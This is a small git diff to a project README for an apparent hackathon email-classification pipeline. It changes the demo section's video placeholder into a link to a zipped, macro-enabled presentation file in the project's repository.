@@ -21,7 +21,7 @@ Email Eclipse-Gen AI's Revolutionizing Email Classification is an End-to-End Pip
 
 ## 🎥 Demo
 🔗 [Live Demo](#) (if applicable)  
-📹 [Video Demo](#) (if applicable)  
+📹 [Video Demo](#) ([if applicable](https://github.com/ewfx/gaied-0-bytes/blob/main/Video.pptm%20%5BRecovered%5D.zip))  
 🖼️ Screenshots:
 
 ![Screenshot 1](link-to-image)
